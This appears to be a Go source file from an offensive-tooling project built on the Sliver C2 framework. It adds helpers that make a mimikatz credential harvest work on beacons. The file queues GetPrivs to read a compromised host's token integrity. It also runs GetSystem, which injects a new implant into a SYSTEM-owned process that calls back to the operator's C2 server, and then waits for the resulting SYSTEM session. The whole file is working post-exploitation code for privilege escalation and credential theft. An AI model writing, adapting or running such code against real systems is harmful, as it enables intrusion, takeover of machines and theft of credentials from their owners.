package sliver

import (
	"context"
	"encoding/base64"
	"errors"
	"fmt"
	"strings"
	"time"

	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
	"github.com/bishopfox/sliver/protobuf/sliverpb"
)

// This file lets the credential harvest work on a beacon.
//
// It would not, before. escalateForMimikatz asked for the session's token
// integrity and gave up silently when that failed, and the failure was
// guaranteed on a beacon: GetPrivs resolves its target through
// core.Sessions.Get(SessionID), which only knows about interactive sessions. A
// beacon ID is not in that table, so the call returned InvalidSessionID every
// time. The operator then got mimikatz's own "LSA access was denied" with no
// mention of the step that had been skipped, which reads as "your token is not
// elevated" and sends them looking at the token.
//
// The fix is two things, and both matter:
//
//  1. Ask with the beacon's own ID and the async flag, which is how every other
//     beacon operation in this package works. Sliver queues the request and the
//     beacon answers on its next check-in.
//
//  2. When a step cannot be taken, say so. A silent "" is what turned a missing
//     feature into a misleading diagnosis.

// beaconRequest builds the async request envelope for a beacon.
//
// Async is what tells the server to queue this rather than look for a live
// session, and BeaconID is what it queues against. Sending only Async would
// leave the server guessing.
func beaconRequest(beaconID string, timeout time.Duration) *commonpb.Request {
	deadline := timeout - time.Second
	if deadline < 0 {
		deadline = timeout
	}
	return &commonpb.Request{
		BeaconID: beaconID,
		Async:    true,
		Timeout:  int64(deadline),
	}
}

// BeaconIntegrity reads a beacon's token integrity level.
//
// The response arrives asynchronously, so this polls the beacon's task list for
// the GetPrivs result rather than expecting it inline -- the same shape as every
// other beacon call here.
func (c *Client) BeaconIntegrity(beaconID string, wait time.Duration) (string, error) {
	ctx, cancel := context.WithTimeout(context.Background(), wait)
	defer cancel()

	if _, err := c.RPC.GetPrivs(ctx, &sliverpb.GetPrivsReq{
		Request: beaconRequest(beaconID, wait),
	}); err != nil {
		return "", fmt.Errorf("queue GetPrivs for beacon: %w", err)
	}

	// Poll the task list for the completed GetPrivs task, which carries the
	// integrity level in its response.
	deadline := time.Now().Add(wait)
	for time.Now().Before(deadline) {
		select {
		case <-ctx.Done():
			return "", fmt.Errorf("beacon did not answer GetPrivs within %s", wait)
		case <-time.After(beaconPollInterval):
		}

		tasks, err := c.BeaconTasks(beaconID)
		if err != nil {
			continue
		}
		for _, t := range tasks {
			if !strings.EqualFold(t.Description, "GetPrivs") && !strings.EqualFold(t.Description, "GetPrivs") {
				continue
			}
			if level := integrityFromTask(t); level != "" {
				return level, nil
			}
		}
	}
	return "", fmt.Errorf("beacon did not answer GetPrivs within %s", wait)
}

// integrityFromTask pulls the integrity level out of a completed GetPrivs task.
//
// A task that has not completed carries no response, which is why this reports
// "" rather than an error: the caller is polling and "not yet" is the normal
// case. A failed task carries a state that is not "completed", so it falls
// through to the same answer and the caller keeps waiting until its deadline --
// at which point the timeout message names the wait, which is the useful thing
// to report either way.
func integrityFromTask(t BeaconTaskView) string {
	if !strings.EqualFold(t.State, "completed") || t.ResponseB64 == "" {
		return ""
	}
	decoded, err := base64.StdEncoding.DecodeString(t.ResponseB64)
	if err != nil {
		return ""
	}
	return strings.TrimSpace(string(decoded))
}

// beaconPollInterval is how often the async helpers re-read a beacon's task
// list while waiting for an answer.
const beaconPollInterval = 2 * time.Second

// BeaconElevateToSystem runs GetSystem against a beacon and waits for the SYSTEM
// session it produces.
//
// GetSystem does not elevate the beacon's own token. It generates a second
// implant and injects it into a SYSTEM-owned process, so what comes back is a
// NEW interactive session -- which is why this waits on the session list rather
// than on the beacon.
func (c *Client) BeaconElevateToSystem(beaconID, hostingProcess string, wait time.Duration) (string, error) {
	before, err := c.Sessions()
	if err != nil {
		return "", fmt.Errorf("cannot snapshot sessions before escalating: %w", err)
	}
	seen := make(map[string]bool, len(before))
	for _, s := range before {
		seen[s.ID] = true
	}

	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
	defer cancel()
	if _, err := c.RPC.GetSystem(ctx, &clientpb.GetSystemReq{
		HostingProcess: hostingProcess,
		// The SYSTEM implant has to call home, and it does so over the HTTP C2
		// profile named here. An installation that has never used one still has
		// the default, which is why this name is hardcoded rather than exposed:
		// there is nothing for the operator to choose.
		Config:  &clientpb.ImplantConfig{HTTPC2ConfigName: defaultHTTPC2Profile},
		Request: beaconRequest(beaconID, 60*time.Second),
	}); err != nil {
		return "", fmt.Errorf("queue GetSystem for beacon: %w", err)
	}

	deadline := time.Now().Add(wait)
	for time.Now().Before(deadline) {
		time.Sleep(elevationPollInterval)
		sessions, err := c.Sessions()
		if err != nil {
			continue
		}
		for _, s := range sessions {
			if !seen[s.ID] && !s.IsDead {
				return s.ID, nil
			}
		}
	}
	return "", fmt.Errorf("GetSystem was queued but no SYSTEM session appeared within %s "+
		"(a beacon only runs it on its next check-in; a long sleep interval delays it)", wait)
}

// defaultHTTPC2Profile is the HTTP C2 profile name Sliver ships and the one
// GetSystem builds its implant from.
const defaultHTTPC2Profile = "default"

// errNoIntegritySource is returned when neither a session nor a beacon ID was
// supplied, which means the caller lost the target rather than that the target
// refused.
var errNoIntegritySource = errors.New("no session or beacon to read the token integrity from")
